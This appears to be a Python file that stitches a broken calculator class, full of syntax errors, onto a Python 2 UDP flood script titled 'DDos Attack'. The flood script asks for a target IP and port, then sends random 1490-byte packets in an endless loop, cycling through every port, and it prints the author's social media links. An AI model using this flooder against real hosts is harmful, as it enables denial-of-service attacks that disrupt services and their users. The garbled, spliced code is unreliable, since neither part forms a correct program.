class calc:
    def __init__ (self.num1,num2)
        self.nom1=num1
        self.num2= num2
        
def sum(self):
    r = self.num1 + self.num2
    print(r)

x = calc(5,5)
x = sum() :import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
                                                                print "Author   : hidden person"
print "You Tube : https://youtu.be/GyT6nTjA2is"
print "github   : https://github.com/Cobra1877/hiddenperson1899"
print "Facebook : https://www.facebook.com/profile.php?id=100043000909115"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
